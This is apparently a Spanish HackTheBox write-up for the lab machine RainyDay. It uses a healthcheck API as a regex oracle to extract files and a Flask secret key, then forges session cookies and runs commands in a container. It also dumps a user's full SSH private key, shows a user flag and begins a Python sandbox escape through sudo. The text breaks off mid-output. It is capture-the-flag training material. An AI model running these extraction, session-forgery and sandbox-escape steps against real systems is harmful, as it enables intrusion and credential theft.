+        <span class="code-blue">"type"</span><span class="code-white">: <span class="code-dark-green">"ELF"</span></span>
+<span class="code-white">      }</span>
+<span class="code-white">    },</span>
+<span class="code-white">    {</span>
+      <span class="code-blue">"file"</span><span class="code-white">: </span><span class="code-dark-green">"/var/www/rainycloud/app.py"</span><span class="code-white">,</span>
+      <span class="code-blue">"pattern"</span><span class="code-white">: </span>{</span>
+        <span class="code-blue">"type"</span><span class="code-white">: </span><span class="code-dark-green">"PYTHON"</span>
+<span class="code-white">      }</span>
+<span class="code-white">    },</span>
+<span class="code-white">    {</span>
+      <span class="code-blue">"file"</span><span class="code-white">: </span><span class="code-dark-green">"/var/www/rainycloud/sessions/db.sqlite"</span><span class="code-white">,</span>  
+      <span class="code-blue">"pattern"</span><span class="code-white">: {</span>
+        <span class="code-blue">"type"</span><span class="code-white">: </span><span class="code-dark-green">"SQLITE"</span></span>
+<span class="code-white">      }</span>
+<span class="code-white">    },</span>
+<span class="code-white">    {</span>
+      <span class="code-blue">"file"</span><span class="code-white">: </span><span class="code-dark-green">"/etc/passwd"</span><span class="code-white">,</span>
+      <span class="code-blue">"pattern"</span><span class="code-white">: {</span>
+        <span class="code-blue">"pattern"</span><span class="code-white">: </span><span class="code-dark-green">"^root.*"</span><span class="code-white">,</span>
+        <span class="code-blue">"type"</span><span class="code-white">: </span><span class="code-dark-green">"CUSTOM"</span>
+<span class="code-white">      }</span>
+<span class="code-white">    }</span>
+<span class="code-white">  ]</span>
+<span class="code-white">}</span>
+</code></pre></div><p>Como se trata de una API, podemos probar a mandar peticiones POST:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">curl</span> rainycloud.htb/api/healthcheck -d <span class="code-dark-yellow">''</span>
+POST only allowed from internal systems
+
+<span class="code-cyan">$</span> <span class="code-dark-green">curl</span> dev.rainycloud.htb/api/healthcheck -d <span class="code-dark-yellow">''</span>
+Unauthenticated
+
+<span class="code-cyan">$</span> <span class="code-dark-green">curl</span> dev.rainycloud.htb/api/healthcheck -d <span class="code-dark-yellow">''</span> -H <span class="code-dark-yellow">"Cookie: session=<span class="code-dark-cyan">$cookie</span>"</span>  
+ERROR - missing parameter
+</code></pre></div><h2 id="acceso-a-la-máquina">Acceso a la máquina</h2><p>Solamente nos permiten enviar peticiones POST en el entorno de desarrollo, y usando la <em>cookie</em> de sesión. Después de probar un poco, obtenemos una salida exitosa:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">curl</span> dev.rainycloud.htb/api/healthcheck -d <span class="code-dark-yellow">'file=/etc/passwd&pattern=root&type=CUSTOM'</span> -sH <span class="code-dark-yellow">"Cookie: session=<span class="code-dark-cyan">$cookie</span>"</span> | <span class="code-dark-green">jq</span>  
+<span class="code-white">{</span>
+  <span class="code-blue">"result"</span><span class="code-white">: </span>true<span class="code-white">,</span>
+  <span class="code-blue">"results"</span><span class="code-white">: [</span>
+    {</span>
+<span class="code-white">      <span class="code-blue">"file"</span><span class="code-white">: <span class="code-dark-green">"/etc/passwd"</span><span class="code-white">,</span>
+      <span class="code-blue">"pattern"</span><span class="code-white">: {</span>
+        <span class="code-blue">"pattern"</span><span class="code-white">: <span class="code-dark-green">"root"</span><span class="code-white">,</span>
+        <span class="code-blue">"type"</span><span class="code-white">: <span class="code-dark-green">"CUSTOM"</span>
+<span class="code-white">      }</span>
+<span class="code-white">    }</span>
+<span class="code-white">  ]</span>
+<span class="code-white">}</span>
+</code></pre></div><p>Ahora tenemos una manera de extraer archivos carácter a carácter:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">curl</span> dev.rainycloud.htb/api/healthcheck -d <span class="code-dark-yellow">'file=/etc/hostname&pattern=rainyday&type=CUSTOM'</span> -sH <span class="code-dark-yellow">"Cookie: session=<span class="code-dark-cyan">$cookie</span>"</span> | <span class="code-dark-green">jq</span> .result  
+true
+
+<span class="code-cyan">$</span> <span class="code-dark-green">curl</span> dev.rainycloud.htb/api/healthcheck -d <span class="code-dark-yellow">'file=/etc/hostname&pattern=rainydax&type=CUSTOM'</span> -sH <span class="code-dark-yellow">"Cookie: session=<span class="code-dark-cyan">$cookie</span>"</span> | <span class="code-dark-green">jq</span> .result
+false
+</code></pre></div><h3 id="leyendo-archivos-del-servidor">Leyendo archivos del servidor</h3><p>Estaremos extrayendo el código fuente de Python localizado en <code>/var/www/rainycloud/app.py</code> mediante este oráculo (byte a byte):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">curl</span> dev.rainycloud.htb/api/healthcheck -d <span class="code-dark-yellow">'file=/var/www/rainycloud/app.py&pattern=#&type=CUSTOM'</span> -sH <span class="code-dark-yellow">"Cookie: session=<span class="code-dark-cyan">$cookie</span>"</span> | <span class="code-dark-green">jq</span> .result
+true
+
+<span class="code-cyan">$</span> <span class="code-dark-green">curl</span> dev.rainycloud.htb/api/healthcheck -d <span class="code-dark-yellow">'file=/var/www/rainycloud/app.py&pattern=#!/usr/bin/python3&type=CUSTOM'</span> -sH <span class="code-dark-yellow">"Cookie: session=<span class="code-dark-cyan">$cookie</span>"</span> | <span class="code-dark-green">jq</span> .result
+true
+
+<span class="code-cyan">$</span> <span class="code-dark-green">curl</span> dev.rainycloud.htb/api/healthcheck -d <span class="code-dark-yellow">'file=/var/www/rainycloud/app.py&pattern=#!/usr/bin/python3%0a&type=CUSTOM'</span> -sH <span class="code-dark-yellow">"Cookie: session=<span class="code-dark-cyan">$cookie</span>"</span> | <span class="code-dark-green">jq</span> .result  
+true
+</code></pre></div><p>También podemos aproximar la longitud del archivo:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">curl</span> dev.rainycloud.htb/api/healthcheck -d <span class="code-dark-yellow">'file=/var/www/rainycloud/app.py&pattern=[\s\S]{200,}&type=CUSTOM'</span> -sH <span class="code-dark-yellow">"Cookie: session=<span class="code-dark-cyan">$cookie</span>"</span> | <span class="code-dark-green">jq</span> .result
+true
+
+<span class="code-cyan">$</span> <span class="code-dark-green">curl</span> dev.rainycloud.htb/api/healthcheck -d <span class="code-dark-yellow">'file=/var/www/rainycloud/app.py&pattern=[\s\S]{500,}&type=CUSTOM'</span> -sH <span class="code-dark-yellow">"Cookie: session=<span class="code-dark-cyan">$cookie</span>"</span> | <span class="code-dark-green">jq</span> .result
+true
+
+<span class="code-cyan">$</span> <span class="code-dark-green">curl</span> dev.rainycloud.htb/api/healthcheck -d <span class="code-dark-yellow">'file=/var/www/rainycloud/app.py&pattern=[\s\S]{5000,}&type=CUSTOM'</span> -sH <span class="code-dark-yellow">"Cookie: session=<span class="code-dark-cyan">$cookie</span>"</span> | <span class="code-dark-green">jq</span> .result
+true
+
+<span class="code-cyan">$</span> <span class="code-dark-green">curl</span> dev.rainycloud.htb/api/healthcheck -d <span class="code-dark-yellow">'file=/var/www/rainycloud/app.py&pattern=[\s\S]{10000,}&type=CUSTOM'</span> -sH <span class="code-dark-yellow">"Cookie: session=<span class="code-dark-cyan">$cookie</span>"</span> | <span class="code-dark-green">jq</span> .result  
+true
+
+<span class="code-cyan">$</span> <span class="code-dark-green">curl</span> dev.rainycloud.htb/api/healthcheck -d <span class="code-dark-yellow">'file=/var/www/rainycloud/app.py&pattern=[\s\S]{20000,}&type=CUSTOM'</span> -sH <span class="code-dark-yellow">"Cookie: session=<span class="code-dark-cyan">$cookie</span>"</span> | <span class="code-dark-green">jq</span> .result
+false
+</code></pre></div><p>Por tanto, vamos a automatizar el proceso de extracción con un <em>script</em> en Python que utilice búsqueda binaria para sacar la longitud del archivo y luego extraiga su contenido: <a href="https://github.com/7Rocky/HackTheBox-scripts/tree/main/Machines/RainyDay/extract_file.py">extract_file.py</a> (explicación detallada <a href="https://github.com/7Rocky/HackTheBox-scripts/tree/main/Machines/RainyDay#extract_filepy">aquí</a>).</p><p>Después de un rato, encontramos las primeras líneas de <code>/var/www/rainycloud/app.py</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">extract_file.py</span> $cookie /var/www/rainycloud/app.py  
+[<span class="code-green">+</span>] Length: 11572
+[<span class="code-blue">&lt;</span>] Content: 449 / 11572
+
+    #!/usr/bin/python3
+
+    import re
+    from flask import *
+    import docker
+    import bcrypt
+    import socket
+    import string
+    from flask_sqlalchemy import SQLAlchemy
+    from os.path import exists
+    from hashlib import md5
+    from inspect import currentframe, getframeinfo
+    from urllib.parse import urlparse
+    from flask_limiter import Limiter
+    from flask_limiter.util import get_remote_address
+
+    #secrets.py
+    from secrets import SECRET_KEY
+
+    app = Flask(__name__, static_url_path="")
+
+[<span class="code-yellow">!</span>] Exiting...
+</code></pre></div><p>Entonces, continuaré extrayendo este archivo en segundo plano pero me centraré más en extraer la clave secreta de <code>/var/www/rainycloud/secrets.py</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">extract_file.py</span> $cookie /var/www/rainycloud/secrets.py
+[<span class="code-green">+</span>] Length: 80
+[<span class="code-green">+</span>] Content: 80 / 80
+
+    SECRET_KEY = 'f77dd59f50ba412fcfbd3e653f8f3f2ca97224dd53cf6304b4c86658a75d8f67'  
+[<span class="code-green">+</span>] File saved as: var_www_rainycloud_secrets.py
+[<span class="code-blue">*</span>] Elapsed time: 0:02:51
+</code></pre></div><h3 id="acceso-al-contenedor-de-jack">Acceso al contenedor de <code>jack</code></h3><p>Ahora podemos falsificar sesiones de Flask usando la clave secreta anterior y <a href="https://pypi.org/project/flask-unsign/"><code>flask-unsign</code></a>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">flask-unsign</span> -s -c <span class="code-dark-yellow">"{'username': 'jack'}"</span> --secret f77dd59f50ba412fcfbd3e653f8f3f2ca97224dd53cf6304b4c86658a75d8f67  
+eyJ1c2VybmFtZSI6ImphY2sifQ.Y0yRIA.8_oTEQXDDh4fNwYdvGeJVuWQs_8
+</code></pre></div><p>Con esta <em>cookie</em>, podemos interactuar con el contenedor de <code>jack</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> cookie=eyJ1c2VybmFtZSI6ImphY2sifQ.Y0yRIA.8_oTEQXDDh4fNwYdvGeJVuWQs_8
+
+<span class="code-cyan">$</span> <span class="code-dark-yellow">function</span> exec_cmd<span class="code-dark-yellow">()</span> <span class="code-dark-yellow">{</span> <span class="code-dark-green">curl</span> rainycloud.htb/containers --data-urlencode <span class="code-dark-yellow">"action=exec<span class="code-dark-cyan">$1</span>"</span> -sd <span class="code-dark-yellow">'id=c0fe876cc336487fb0bf8e28e08538a6dff303eb21ce58051015fb1eec4dded8'</span> -H <span class="code-dark-yellow">"Cookie: session=<span class="code-dark-cyan">$cookie</span>"</span> <span class="code-dark-yellow">}</span>  
+
+<span class="code-cyan">$</span> <span class="code-dark-green">exec_cmd</span> <span class="code-dark-yellow">'ls -la'</span>
+total 64
+drwxr-xr-x    1 root     root          4096 Sep 29 13:47 .
+drwxr-xr-x    1 root     root          4096 Sep 29 13:47 ..
+-rwxr-xr-x    1 root     root             0 Aug 25 10:33 .dockerenv
+drwxr-xr-x    2 root     root          4096 Sep 29 13:47 bin
+drwxr-xr-x   15 root     root          3860 Oct 16 19:02 dev
+drwxr-xr-x    1 root     root          4096 Sep 29 13:47 etc
+drwxr-xr-x    2 root     root          4096 Sep 29 13:47 home
+drwxr-xr-x    1 root     root          4096 Sep 29 13:47 lib
+-rwxrwxrwx    1 root     root             0 Oct 16 19:02 logfile
+drwxr-xr-x    5 root     root          4096 Sep 29 13:47 media
+drwxr-xr-x    2 root     root          4096 Sep 29 13:47 mnt
+drwxr-xr-x    1 root     root          4096 Sep 29 13:47 opt
+dr-xr-xr-x  286 root     root             0 Oct 16 19:02 proc
+drwx------    1 root     root          4096 Sep 29 13:47 root
+drwxr-xr-x    2 root     root          4096 Sep 29 13:47 run
+drwxr-xr-x    2 root     root          4096 Sep 29 13:47 sbin
+drwxr-xr-x    2 root     root          4096 Sep 29 13:47 srv
+dr-xr-xr-x   13 root     root             0 Oct 16 19:02 sys
+drwxrwxrwt    2 root     root          4096 Sep 29 13:47 tmp
+drwxr-xr-x    1 root     root          4096 Sep 29 13:47 usr
+drwxr-xr-x    1 root     root          4096 Sep 29 13:47 var
+
+<span class="code-cyan">$</span> <span class="code-dark-green">exec_cmd</span> <span class="code-dark-yellow">'hostname'</span>
+c0fe876cc336
+</code></pre></div><p>Hay una nota que dice que el contenedor de Docker no es completamente seguro:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">exec_cmd</span> <span class="code-dark-yellow">'ls -la /opt'</span>
+total 12
+drwxr-xr-x    1 root     root          4096 Sep 29 13:47 .
+drwxr-xr-x    1 root     root          4096 Sep 29 13:47 ..
+drwxr-xr-x    2 root     root          4096 Sep 29 13:47 notes
+
+<span class="code-cyan">$</span> <span class="code-dark-green">exec_cmd</span> <span class="code-dark-yellow">'ls -la /opt/notes'</span>
+total 12
+drwxr-xr-x    2 root     root          4096 Sep 29 13:47 .
+drwxr-xr-x    1 root     root          4096 Sep 29 13:47 ..
+-rw-r--r--    1 root     root           134 Aug 25 10:41 dev_notes.txt
+
+<span class="code-cyan">$</span> <span class="code-dark-green">exec_cmd</span> <span class="code-dark-yellow">'cat /opt/notes/dev_notes.txt'</span>
+ - A friend sent me some 'best practices' for docker containers that he suggested I should read through. Set aside some time for that  
+</code></pre></div><h3 id="acceso-mediante-ssh">Acceso mediante SSH</h3><p>De hecho, antes éramos capaces de ver procesos de la máquina. En efecto, hay un proceso ejecutado por el usuario con UID 1000:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">exec_cmd</span> <span class="code-dark-yellow">'ps -a'</span> | <span class="code-dark-green">grep</span> -a 1000
+ 1189 <span class="code-red">1000</span>      0:00 sleep <span class="code-red">1000</span>00000
+22510 <span class="code-red">1000</span>      1:14 /tmp/.chisel client 10.10.14.43:1234 R:80:172.18.0.1:80  
+38949 <span class="code-red">1000</span>      0:00 /bin/sh
+39387 <span class="code-red">1000</span>      0:00 sh
+39917 <span class="code-red">1000</span>      0:00 sh
+55037 <span class="code-red">1000</span>      0:00 /lib/systemd/systemd --user
+55039 <span class="code-red">1000</span>      0:00 (sd-pam)
+55150 <span class="code-red">1000</span>      0:00 sshd: jack@pts/0
+55153 <span class="code-red">1000</span>      0:00 -bash
+</code></pre></div><p>Entonces, podemos coger su PID (1189) y mirar en <code>/proc/1189/cwd</code> para ver el directorio de trabajo actual de dicho proceso:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">exec_cmd</span> <span class="code-dark-yellow">'ls -l /proc/1189/cwd'</span>
+lrwxrwxrwx    1 1000     1000             0 Oct 16 23:32 /proc/1189/cwd -&gt; /home/jack  
+</code></pre></div><p>Y así accedemos a <code>/home/jack</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">exec_cmd</span> <span class="code-dark-yellow">'ls -la /proc/1189/cwd/'</span>
+total 28
+drwxr-x---    3 1000     1000          4096 Sep 29 13:47 .
+drwxr-xr-x    4 root     root          4096 Sep 29 13:47 ..
+lrwxrwxrwx    1 root     root             9 Sep 29 12:16 .bash_history -&gt; /dev/null  
+-rw-r--r--    1 1000     1000           220 Jan  6  2022 .bash_logout
+-rw-r--r--    1 1000     1000          3771 Jan  6  2022 .bashrc
+-rw-r--r--    1 1000     1000           807 Jan  6  2022 .profile
+drwx------    2 1000     1000          4096 Sep 29 13:47 .ssh
+-rw-r-----    1 1000     1000            33 Oct 16 19:02 user.txt
+</code></pre></div><p>Realmente, esto también era posible desde el contenedor de <code>gary</code>, pero mediante una <em>reverse shell</em> en segundo plano (porque la ejecución normal tenía UID 1337, y en segundo plano tenía UID 1000&mldr; un poco raro).</p><p>Para acceder a la máquina, vamos a coger la clave privade de SSH de <code>jack</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">exec_cmd</span> <span class="code-dark-yellow">'cat /proc/1189/cwd/.ssh/id_rsa'</span> | <span class="code-dark-green">tee</span> id_rsa
+-----BEGIN OPENSSH PRIVATE KEY-----
+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
+-----END OPENSSH PRIVATE KEY-----
+</code></pre></div><p>Y ya tenemos acceso a la máquina, por lo que podemos leer la <em>flag</em> <code>user.txt</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">chmod</span> 600 <span class="mtku">id_rsa</span>
+
+<span class="code-cyan">$</span> <span class="code-dark-green">ssh</span> -i <span class="mtku">id_rsa</span> jack@10.10.11.184  
+<span class="code-green">jack@rainyday</span>:<span class="code-blue">~</span>$ cat user.txt
+9226a9ba80213b820a524184ecf52e85
+</code></pre></div><h2 id="movimiento-lateral-al-usuario-jack_adm">Movimiento lateral al usuario <code>jack_adm</code></h2><p>La enumeración básica nos dice que <code>jack</code> puede ejecutar <code>/usr/bin/safe_python</code> como <code>jack_adm</code> usando <code>sudo</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">jack@rainyday</span>:<span class="code-blue">~</span>$ sudo -l
+Matching Defaults entries for jack on localhost:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty  
+
+User jack may run the following commands on localhost:
+    (jack_adm) NOPASSWD: /usr/bin/safe_python *
+</code></pre></div><p>Pero no podemos leer este archivo:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">jack@rainyday</span>:<span class="code-blue">~</span>$ ls -l /usr/bin/safe_python
+-rwxr-x--- 1 root jack_adm 710 Jun  5 12:52 <span class="code-green">/usr/bin/safe_python  
+</code></pre></div><p>Aunque sí vemos que su tamaño es de 710 bytes, por lo que tiene que ser un archivo de texto (probablemente un <em>script</em> en Python o en Bash).</p><p>Con las siguientes pruebas, podemos asegurarnos de que es un <em>script</em> en Python:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">jack@rainyday</span>:<span class="code-blue">~</span>$ sudo -u jack_adm /usr/bin/safe_python
+Traceback (most recent call last):
+  File "/usr/bin/safe_python", line 28, in &lt;module&gt;
+    with open(sys.argv[1]) as f:
+IndexError: list index out of range
+<span class="code-green">jack@rainyday</span>:<span class="code-blue">~</span>$ sudo -u jack_adm /usr/bin/safe_python /usr/bin/safe_python  
+Traceback (most recent call last):
+  File "/usr/bin/safe_python", line 29, in &lt;module&gt;
+    exec(f.read(), env)
+  File "&lt;string&gt;", line 3, in &lt;module&gt;
+ImportError: __import__ not found
+</code></pre></div><p>Genial, ya sabemos que es un <em>script</em> en Python que utiliza <code>exec</code> para ejecutar otro <em>script</em> de Python. Vamos a probar el código más simple para obtener una <em>shell</em> como <code>jack_adm</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">jack@rainyday</span>:<span class="code-blue">~</span>$ echo 'import os; os.system("whoami")' &gt; /tmp/a.py  
+<span class="code-green">jack@rainyday</span>:<span class="code-blue">~</span>$ sudo -u jack_adm /usr/bin/safe_python /tmp/a.py
+Traceback (most recent call last):
+  File "/usr/bin/safe_python", line 29, in &lt;module&gt;
+    exec(f.read(), env)
+  File "&lt;string&gt;", line 1, in &lt;module&gt;
+ImportError: __import__ not found
+</code></pre></div><h3 id="escape-del-_sandbox_-de-python">Escape del <em>sandbox</em> de Python</h3><p>Bueno, no podemos usar <code>import</code>. Entonces, tenemso que utilizar técnicas de escape de <em>sandbox</em>. Hay algunos ejemplos en <a href="https://book.hacktricks.xyz/generic-methodologies-and-resources/python/bypass-python-sandboxes">HackTricks</a>. Uno de ellos consiste en obtener la lista de <code>__subclasses__</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">jack@rainyday</span>:<span class="code-blue">~</span>$ echo 'print(().__class__.__base__.__subclasses__())' &gt; /tmp/a.py
+<span class="code-green">jack@rainyday</span>:<span class="code-blue">~</span>$ sudo -u jack_adm /usr/bin/safe_python /tmp/a.py
+[&lt;class 'type'&gt;, &lt;class 'async_generator'&gt;, &lt;class 'int'&gt;, &lt;class 'bytearray_iterator'&gt;, &lt;class 'bytearray'&gt;, &lt;class 'bytes_iterator'&gt;, &lt;class 'bytes'&gt;, &lt;class 'builtin_function_or_method'&gt;, &lt;class 'callable_iterator'&gt;, &lt;class 'PyCapsule'&gt;, &lt;class 'cell'&gt;, &lt;class 'classmethod_descriptor'&gt;, &lt;class 'classmethod'&gt;, &lt;class 'code'&gt;, &lt;class 'complex'&gt;, &lt;class 'coroutine'&gt;, &lt;class 'dict_items'&gt;, &lt;class 'dict_itemiterator'&gt;, &lt;class 'dict_keyiterator'&gt;, &lt;class 'dict_valueiterator'&gt;, &lt;class 'dict_keys'&gt;, &lt;class 'mappingproxy'&gt;, &lt;class 'dict_reverseitemiterator'&gt;, &lt;class 'dict_reversekeyiterator'&gt;, &lt;class 'dict_reversevalueiterator'&gt;, &lt;class 'dict_values'&gt;, &lt;class 'dict'&gt;, &lt;class 'ellipsis'&gt;, &lt;class 'enumerate'&gt;, &lt;class 'float'&gt;, &lt;class 'frame'&gt;, &lt;class 'frozenset'&gt;, &lt;class 'function'&gt;, &lt;class 'generator'&gt;, &lt;class 'getset_descriptor'&gt;, &lt;class 'instancemethod'&gt;, &lt;class 'list_iterator'&gt;, &lt;class 'list_reverseiterator'&gt;, &lt;class 'list'&gt;, &lt;class 'longrange_iterator'&gt;, &lt;class 'member_descriptor'&gt;, &lt;class 'memoryview'&gt;, &lt;class 'method_descriptor'&gt;, &lt;class 'method'&gt;, &lt;class 'moduledef'&gt;, &lt;class 'module'&gt;, &lt;class 'odict_iterator'&gt;, &lt;class 'pickle.PickleBuffer'&gt;, &lt;class 'property'&gt;, &lt;class 'range_iterator'&gt;, &lt;class 'range'&gt;, &lt;class 'reversed'&gt;, &lt;class 'symtable entry'&gt;, &lt;class 'iterator'&gt;, &lt;class 'set_iterator'&gt;, &lt;class 'set'&gt;, &lt;class 'slice'&gt;, &lt;class 'staticmethod'&gt;, &lt;class 'stderrprinter'&gt;, &lt;class 'super'&gt;, &lt;class 'traceback'&gt;, &lt;class 'tuple_iterator'&gt;, &lt;class 'tuple'&gt;, &lt;class 'str_iterator'&gt;, &lt;class 'str'&gt;, &lt;class 'wrapper_descriptor'&gt;, &lt;class 'types.GenericAlias'&gt;, &lt;class 'anext_awaitable'&gt;, &lt;class 'async_generator_asend'&gt;, 